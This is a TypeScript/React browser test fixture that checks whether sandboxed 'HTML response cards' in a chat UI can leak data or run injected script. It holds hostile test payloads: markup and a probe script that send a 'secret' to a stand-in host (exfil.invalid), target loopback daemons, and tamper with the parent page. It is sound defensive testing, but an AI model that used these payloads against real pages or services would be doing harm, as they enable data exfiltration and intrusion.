/**
 * Real-Chromium fixture for response cards.
 *
 * Everything on screen goes through the PRODUCTION path — `ConversationMessage`
 * renders assistant text, `parseMarkdownBlocks` finds the fence, and
 * `HtmlResponseCard` builds the frame with `buildCardDocument`. Nothing here
 * reimplements the renderer, because a harness that reimplemented it would
 * prove nothing about what ships.
 *
 * The one exception is the `probe` surface, and it is deliberate: it mounts the
 * SAME `buildCardDocument` output with a script string-injected into the body,
 * to answer the question the sanitizer cannot — "if generated markup ever did
 * get a `<script>` through, would the browser run it?". Two frames, identical
 * but for the nonce, so a negative result is a measurement rather than an
 * absence.
 *
 * jsdom cannot answer any of this: it has no CSP engine, no iframe sandbox and
 * no navigation. Driven by tests/e2e/htmlCard.test.ts.
 */
import React, { useState } from 'react';
import { createRoot } from 'react-dom/client';
import '../App.css';
import { applyTheme, darkTheme, lightTheme } from '../themes';
import { ConversationMessage } from '../components/claude/ConversationMessage';
import { HtmlCardHostProvider } from '../components/claude/HtmlResponseCard';
import {
  buildCardDocument,
  cardNonce,
  hostThemeVars,
  CARD_SANDBOX,
} from '../lib/htmlCard/cardShell';
import type { ConversationTurn } from '../types/claudeSession';

const params = new URLSearchParams(location.search);
const isLight = params.get('theme') === 'light';
applyTheme(isLight ? lightTheme : darkTheme);

// A positive control for the request observer in the spec: if this ONE request
// is not seen, an "observed zero requests" assertion below would be vacuous.
void fetch('/__harness_probe_control').catch(() => {});

const fence = (payload: unknown, close = true) =>
  '```wks-html-card\n' + JSON.stringify(payload) + (close ? '\n```' : '');

const turn = (role: 'user' | 'assistant', content: string): ConversationTurn =>
  ({ role, content, timestamp: Date.now() }) as ConversationTurn;

/** Loopback daemons a same-machine card would be a new path into. */
export const LOOPBACK = ['http://127.0.0.1:7891/sessions', 'http://127.0.0.1:7897/mcp'];
const EXTERNAL = 'https://exfil.invalid/beacon?q=secret';

const REPORT_CARD = {
  v: 1,
  title: 'Review: 3 findings',
  bodyHtml:
    '<p>Three findings, worst first.</p>' +
    '<input type="search" data-wks-filter="rows" placeholder="Filter findings" aria-label="Filter findings">' +
    '<table id="rows"><caption><span data-wks-filter-count>3</span> shown</caption><thead><tr><th data-wks-sort="text">File</th>' +
    '<th data-wks-sort="number">Lines</th></tr></thead><tbody>' +
    '<tr data-wks-filter-item><td>auth/token.ts</td><td>412</td></tr>' +
    '<tr data-wks-filter-item><td>auth/session.ts</td><td>88</td></tr>' +
    '<tr data-wks-filter-item><td>db/index.ts</td><td>1201</td></tr>' +
    '</tbody></table>' +
    '<details><summary>Why the first one matters</summary><p>Refresh tokens never expire.</p></details>',
  css: '.muted { opacity: 0.7 }',
  fallback:
    'Three findings: auth/token.ts (412 lines) issues refresh tokens with no expiry; ' +
    'auth/session.ts (88) omits SameSite; db/index.ts (1201) is missing an index.',
  actions: [
    { kind: 'view_diff', label: 'Diff auth/token.ts', path: 'auth/token.ts' },
    { kind: 'fill_composer', label: 'Draft the reply', text: 'Please fix the token expiry first.' },
  ],
};

/** Every navigation and resource-load shape a card could try WITHOUT script. */
const HOSTILE_CARD = {
  v: 1,
  title: 'Hostile markup',
  bodyHtml:
    `<meta http-equiv="refresh" content="0;url=${EXTERNAL}">` +
    `<a id="ext" href="${EXTERNAL}">external link</a> ` +
    `<a id="loop" href="${LOOPBACK[0]}" target="_top">loopback link</a>` +
    `<form id="frm" action="${EXTERNAL}" method="get"><input name="q" value="secret"><input type="submit" value="go"></form>` +
    `<img id="beacon" src="${EXTERNAL}&as=img">` +
    `<iframe id="nested" src="${LOOPBACK[1]}"></iframe>` +
    `<object data="${EXTERNAL}"></object>` +
    `<link rel="stylesheet" href="${EXTERNAL}&as=css">` +
    `<div id="styled" style="background:url(${EXTERNAL}&as=inline)">styled</div>` +
    `<script>location.href='${EXTERNAL}';parent.postMessage({probe:'sanitized-script-ran'},'*')</script>` +
    `<div onclick="parent.postMessage({probe:'handler-ran'},'*')" id="clickme">click me</div>` +
    `<p id="survivor">the words survive</p>`,
  css: `@import url("${EXTERNAL}&as=import"); body { background-image: url("${EXTERNAL}&as=css-bg") }`,
  fallback: 'Nothing here should reach the network.',
};

const MALFORMED = {
  v: 99,
  title: 'From the future',
  bodyHtml: '<p>x</p>',
  fallback: 'A v99 card.',
};

const HOST = { sessionId: 'harness-session', paneId: 'harness-pane', cwd: '/work/project' };

const Cards: React.FC = () => {
  const [light, setLight] = useState(isLight);
  return (
    <main
      style={{
        padding: 16,
        background: 'var(--wks-bg-base)',
        color: 'var(--wks-text-primary)',
        minHeight: '100vh',
        boxSizing: 'border-box',
        fontFamily: 'var(--wks-font-sans)',
      }}
    >
      <button
        id="before-card"
        onClick={() => {
          const next = !light;
          setLight(next);
          applyTheme(next ? lightTheme : darkTheme);
        }}
      >
        Toggle theme
      </button>
      <div style={{ maxWidth: 'var(--wks-chat-width, 900px)' }}>
        <HtmlCardHostProvider value={HOST}>
          <ConversationMessage
            turn={turn('assistant', `Here is the review.\n\n${fence(REPORT_CARD)}`)}
            cwd={HOST.cwd}
          />
          <ConversationMessage turn={turn('assistant', fence(HOSTILE_CARD))} cwd={HOST.cwd} />
          <ConversationMessage turn={turn('assistant', fence(MALFORMED))} cwd={HOST.cwd} />
          {/* Still streaming: the fence has not closed. */}
          <ConversationMessage turn={turn('assistant', fence(REPORT_CARD, false))} cwd={HOST.cwd} />
          {/* A person pasting the same fence gets a code block, not a card. */}
          <ConversationMessage turn={turn('user', fence(REPORT_CARD))} cwd={HOST.cwd} />
        </HtmlCardHostProvider>
      </div>
      <button id="after-card">After the card</button>
    </main>
  );
};

/**
 * The nonce experiment. Both frames get the production shell; only one gets the
 * nonce on the injected script. The difference between them IS the measurement.
 */
const PROBE_SCRIPT = `
  try { parent.postMessage({ probe: 'script-ran' }, '*'); } catch (e) {}
  try { parent.document.title = 'pwned'; parent.postMessage({ probe: 'parent-dom' }, '*'); } catch (e) {}
  try { fetch(${JSON.stringify(EXTERNAL)}); } catch (e) {}
  ${LOOPBACK.map((u) => `try { fetch(${JSON.stringify(u)}); } catch (e) {}`).join('\n  ')}
  try { new Image().src = ${JSON.stringify(EXTERNAL)} + '&as=probe-img'; } catch (e) {}
  try { new WebSocket('ws://127.0.0.1:7891/ws'); } catch (e) {}
  try { var xhr = new XMLHttpRequest(); xhr.open('GET', ${JSON.stringify(EXTERNAL)} + '&as=xhr'); xhr.send(); } catch (e) {}
  try { top.location = ${JSON.stringify(EXTERNAL)}; } catch (e) {}
  try { window.open(${JSON.stringify(EXTERNAL)}); } catch (e) {}

`;

const Probe: React.FC = () => {
  const nonce = cardNonce();
  const base = buildCardDocument(
    {
      v: 1,
      title: 'probe',
      bodyHtml: '<p>probe</p>',
      fallback: 'probe',
      actions: [],
    },
    { nonce, themeVars: hostThemeVars(), light: isLight },
  ).srcDoc;
  // Injected AFTER the shell built it, which is the "the sanitizer missed one"
  // case. `withNonce` is the control: it proves the script would otherwise run.
  const inject = (attrs: string) =>
    base.replace('</body>', `<script ${attrs}>${PROBE_SCRIPT}</script></body>`);
  return (
    <div>
      <iframe
        id="probe-nonced"
        title="probe with the host nonce"
        sandbox={CARD_SANDBOX}
        srcDoc={inject(`nonce="${nonce}"`)}
        style={{ width: 300, height: 60 }}
      />
      <iframe
        id="probe-plain"
        title="probe without the host nonce"
        sandbox={CARD_SANDBOX}
        srcDoc={inject('')}
        style={{ width: 300, height: 60 }}
      />
    </div>
  );
};

// Messages that reach the page at all, for the spec to read. A probe entry here
// means the frame's script ran; its ABSENCE for the un-nonced frame is the
// enforcement result.
(window as unknown as { __probes: unknown[] }).__probes = [];
window.addEventListener('message', (e) => {
  (window as unknown as { __probes: unknown[] }).__probes.push(e.data);
});

createRoot(document.getElementById('root')!).render(
  params.get('surface') === 'probe' ? <Probe /> : <Cards />,
);
